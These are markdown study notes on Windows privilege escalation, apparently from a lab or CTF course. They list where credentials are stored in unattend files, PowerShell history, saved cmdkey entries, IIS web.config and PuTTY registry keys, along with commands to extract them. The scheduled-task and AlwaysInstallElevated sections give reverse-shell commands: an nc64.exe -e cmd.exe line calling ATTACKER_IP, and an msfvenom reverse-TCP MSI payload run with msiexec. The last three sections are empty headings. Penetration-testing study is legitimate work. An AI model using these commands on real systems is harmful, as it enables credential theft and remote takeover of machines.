# Windows Privilege Escalation 02

## Where to Investigate

### Unattended Installations

Look for the following unattended installation locations for stored credentials:

* C:\Unattend.xml
* C:\Windows\Panther\Unattend.xml
* C:\Windows\Panther\Unattend\Unattend.xml
* C:\Windows\system32\sysprep.inf
* C:\Windows\system32\sysprep\sysprep.xml

### PowerShell History

PowerShell history can be obtained by running the following in CMD

`%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

### Saved Credentials

Option to save credentials ont he system:

`cmdkey /list`

These can then be run as admin by running:

`runas /savecred /user:admin cmd.exe`

### IIS Configuration

Default config that may have saved passwords is web.config, which may be in the following locations:

* C:\inetpub\wwwroot\web.config
* C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Strings in the file can then be obtained by running:

`type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`

### From Software

Stored Putty credentials may be obtained by running:

`reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`

## Scheduled Tasks

Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify:

`schtasks /query /tn vulntask /fo list /v`

If current user is Run As User, then check file privileges:

`icacls c:\tasks\schtask.bat`

If current user is part of group that has full access, then the binary can be modified to spawn a reverse shell such as:

`C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat`

To open listener port on local machine: `nc -lvp 4444`

Then run following task to spawn shell: `C:\> schtasks /run /tn vulntask`

## AlwaysInstallElevated

MSI files may have higher privileges and requires following reg keys to be set:

* C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
* C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

If these are set, msfvenom can be used to spawn malicious msi:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.240.127 LPORT=LOCAL_PORT -f msi -o malicious.msi`

Then run following after msi file has been transfered to windows system:

`C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`

## Service Misconfigurations

Services are managed by the Service Control Manager (SCM). Each service has an associated executible that runs when the service starts. Service configuration can be seen by running:

`sc qc apphostsvc`

The privileges can be obtained by viewing the properties of the service. Services are stored in the registry under: `HKLM\SYSTEM\CurrentControlSet\Services\`

## Dangerous Privileges

## Vulnerable Software

## Tools